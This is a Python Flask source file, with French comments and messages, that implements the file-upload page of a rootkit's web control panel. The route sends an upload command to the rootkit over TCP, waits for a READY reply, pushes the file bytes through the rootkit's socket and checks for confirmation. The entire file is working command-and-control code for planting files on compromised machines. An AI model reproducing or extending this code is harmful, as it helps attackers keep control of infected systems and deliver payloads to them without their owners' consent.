from app import app
import config as cfg
from flask import flash, render_template, redirect, url_for, request, session
from werkzeug.utils import secure_filename
import os

@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('Aucun fichier sélectionné.', 'error')
            return redirect(request.url)

        file = request.files['file']
        remote_path = request.form.get('remote_path')

        if file.filename == '':
            flash('Nom de fichier vide.', 'error')
            return redirect(request.url)

        if not remote_path:
            flash('Chemin distant requis.', 'error')
            return redirect(request.url)

        filename = secure_filename(file.filename)
        file_data = file.read()

        try:
            # 1. Envoie la commande au rootkit
            size = len(file_data)
            command = f"upload {remote_path} {size}"
            response = cfg.rootkit_connexion.send(command, use_history=False, channel="tcp")

            if response is None:
                flash("Aucune réponse du rootkit.", "error")
                return redirect(request.url)

            if response.strip().upper() != "READY":
                flash(f"Refus du rootkit : {response.strip()}", "error")
                return redirect(request.url)

            flash(f"✅ Rootkit prêt pour l'upload vers {remote_path}", "success")

            # 2. Envoi binaire chiffré du fichier
            success = cfg.rootkit_connexion.get_tcp_object()._network_handler.send(
                cfg.rootkit_connexion.get_tcp_object()._client_socket,
                file_data
            )

            if not success:
                flash("❌ Échec de l’envoi du fichier.", 'error')
            else:
                # Ici on attend la confirmation du rootkit
                confirmation = cfg.rootkit_connexion.receive_from_client()
                if confirmation and "successfully" in confirmation.lower():
                    flash("📤 Fichier envoyé avec succès !", 'success')
                else:
                    flash(f"❌ Problème de confirmation : {confirmation}", 'error')

        except Exception as e:
            flash(f"Erreur lors de l’envoi : {e}", 'error')
            return redirect(request.url)

    return render_template('upload.html')
